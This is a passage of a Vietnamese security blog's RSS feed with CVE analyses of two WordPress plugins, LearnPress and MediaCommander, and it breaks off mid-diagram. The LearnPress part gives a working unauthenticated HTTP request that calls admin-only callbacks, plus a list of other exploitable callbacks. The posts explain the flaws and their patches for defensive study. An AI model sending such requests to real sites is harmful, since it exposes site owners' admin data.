aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send request with lp-load-ajax parameter&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;LoadContentViaAjax::catch_lp_ajax() triggered via init hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Check lp-load-ajax parameter exists&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Create instance of LoadContentViaAjax&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Class in $class_no_nonce whitelist → Skip nonce check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Retrieve $class and $method from request data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check if $class:$method is in $allow_callbacks (all callbacks allowed)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;is_callable([class, method])?&amp;#34;]&#xA;I --&amp;gt;|Yes| J[&amp;#34;Execute callback via call_user_func([class, method], args)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Sensitive admin-only data returned to attacker&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request với Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1&#xA;Host: localhost&#xA;Referer: http://localhost&#xA;&#xA;lp-load-ajax=load_content_via_ajax&amp;amp;data={&amp;#34;callback&amp;#34;:{&amp;#34;class&amp;#34;:&amp;#34;LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;render_list_items_not_assign&amp;#34;},&amp;#34;args&amp;#34;:{&amp;#34;quiz_id&amp;#34;:483}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#39; alt=&#34;Result&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Danh sách các callback hợp lệ khác:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Broken Access Control&lt;/strong&gt; trong LearnPress &amp;lt;= 4.3.1 cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; thực thi các callback AJAX vốn chỉ dành cho admin. Vấn đề phát sinh do API không kiểm tra &lt;strong&gt;capability/permission&lt;/strong&gt; trước khi gọi &lt;code&gt;call_user_func([class, method], args)&lt;/code&gt;. Bản vá 4.3.2 đã giới hạn callback hợp lệ và yêu cầu quyền Administrator, ngăn chặn truy cập trái phép.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ cho phép callback động thực thi mà không kiểm tra quyền.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;lp-load-ajax&lt;/code&gt; endpoint có thể trở thành lỗ hổng nếu danh sách callback không bị giới hạn.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác thực &lt;code&gt;nonce&lt;/code&gt; hoặc kiểm tra &lt;strong&gt;referer/domain&lt;/strong&gt; để giảm rủi ro từ request không hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá cần &lt;strong&gt;cố định danh sách callback&lt;/strong&gt; và kết hợp với kiểm tra quyền admin cho các chức năng nhạy cảm.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control thường phát sinh ở các API AJAX/REST khi lập trình viên tin tưởng dữ liệu đầu vào từ client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-wordpress-lms-plugin-plugin-4-3-1-missing-authorization-to-unauthenticated-orders-statistics-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-14508 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-15-cve-2025-14508/</link>
      <pubDate>Mon, 15 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-15-cve-2025-14508/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The MediaCommander – Bring Folders to Media, Posts, and Pages&lt;/strong&gt; cho WordPress tồn tại lỗ hổng &lt;strong&gt;xóa dữ liệu trái phép&lt;/strong&gt; do &lt;strong&gt;thiếu kiểm tra quyền (capability check)&lt;/strong&gt; tại &lt;strong&gt;REST API endpoint &lt;code&gt;import-csv&lt;/code&gt;&lt;/strong&gt; trong tất cả các phiên bản &lt;strong&gt;≤ 2.3.1&lt;/strong&gt;.&#xA;Nguyên nhân là do endpoint này chỉ sử dụng kiểm tra quyền &lt;strong&gt;&lt;code&gt;upload_files&lt;/code&gt;&lt;/strong&gt; (&lt;strong&gt;cấp Author&lt;/strong&gt;) cho một &lt;strong&gt;thao tác mang tính phá hủy&lt;/strong&gt; có thể &lt;strong&gt;xóa toàn bộ folder&lt;/strong&gt;.&#xA;Điều này cho phép &lt;strong&gt;kẻ tấn công đã xác thực&lt;/strong&gt;, với quyền &lt;strong&gt;Author trở lên&lt;/strong&gt;, có thể &lt;strong&gt;xóa toàn bộ dữ liệu tổ chức thư mục&lt;/strong&gt; do &lt;strong&gt;Administrator&lt;/strong&gt; và &lt;strong&gt;người dùng khác&lt;/strong&gt; tạo ra.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-14508&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-14508&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mediacommander/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MediaCommander – Bring Folders to Media, Posts, and Pages Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;MediaCommander – Bring Folders to Media, Posts, and Pages&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.3.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký &lt;strong&gt;REST API&lt;/strong&gt; endpoint &lt;code&gt;/import-csv&lt;/code&gt; với phương thức POST như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL, // mediacommander/v1&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE, // POST&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canUploadFiles&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; là &lt;code&gt;canUploadFiles&lt;/code&gt; để kiểm tra quyền:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canUploadFiles() {&#xA;    return current_user_can( &amp;#39;upload_files&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Quyền &lt;code&gt;upload_files&lt;/code&gt; dành cho người dùng từ Author trở lên.&lt;/li&gt;&#xA;&lt;li&gt;Nếu người dùng không có quyền, REST API trả về lỗi 403.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nếu có quyền, callback &lt;code&gt;importCSV&lt;/code&gt; được gọi để xử lý:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function importCSV( \WP_REST_Request $request ) {&#xA;    $params  = $request-&amp;gt;get_file_params();&#xA;    $file = $params[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];&#xA;    $clear  = filter_var( $request-&amp;gt;get_param( &amp;#39;clear&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;    $attachments  = filter_var( $request-&amp;gt;get_param( &amp;#39;attachments&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;&#xA;    $data = FoldersModel::importCSV( $file, $clear, $attachments );&#xA;    $response = isset( $data ) ? [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; $data ] : [ &amp;#39;success&amp;#39; =&amp;gt; false ];&#xA;&#xA;    return new \WP_REST_Response( $response );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;importCSV&lt;/code&gt; thực hiện:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy file CSV từ request.&lt;/li&gt;&#xA;&lt;li&gt;Lấy các tham số &lt;code&gt;clear&lt;/code&gt; và &lt;code&gt;attachments&lt;/code&gt;, chuyển về boolean.&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;FoldersModel::importCSV&lt;/code&gt; để xử lý dữ liệu CSV.&lt;/li&gt;&#xA;&lt;li&gt;Trả về JSON gồm &lt;code&gt;success&lt;/code&gt; và &lt;code&gt;data&lt;/code&gt; (nếu có) hoặc &lt;code&gt;success: false&lt;/code&gt; khi lỗi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Cảnh báo&lt;/p&gt;&lt;p&gt;Tham số &lt;code&gt;clear&lt;/code&gt; sẽ xóa toàn bộ các folder cũ nếu được đặt là &lt;code&gt;true&lt;/code&gt;.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#34; title=&#34;Tham số clear&#34; data-thumbnail=&#34;/posts/2025-12-15-cve-2025-14508/clear.png&#34; data-sub-html=&#34;&lt;h2&gt;clear&lt;/h2&gt;&lt;p&gt;Tham số clear&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-15-cve-2025-14508/clear.png&#39; alt=&#34;clear&#34; height=&#34;209&#34; width=&#34;1091&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tham số clear&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v2.4.0)&lt;/strong&gt; khắc phục lỗ hổng bằng cách thay đối logic kiểm tra quyền:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    MEDIACOMMANDER_PLUGIN_REST_URL,&#xA;    &amp;#39;/import-csv&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39; =&amp;gt; \WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;importCSV&amp;#39; ],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;canManageOptions&amp;#39; ]&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;permission_callback&lt;/code&gt; là &lt;code&gt;canManageOptions&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function canManageOptions() {&#xA;    return current_user_can( &amp;#39;manage_options&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quyền &lt;code&gt;manage_options&lt;/code&gt; dành cho người dùng từ Administrator trở lên.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Authenticated user (Author&amp;#43;)&amp;#34;] --&amp;gt; B[&amp;#34;POST /wp-json/mediacommander/v1/import-csv&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;permission_callback: canUploadFiles()&amp;#34;]&#xA;C --&amp;gt; D{&amp;#34;Has upload_files capability?&amp;#34;}&#xA;D -- Yes --&amp;gt; E[&amp;#34;importCSV() 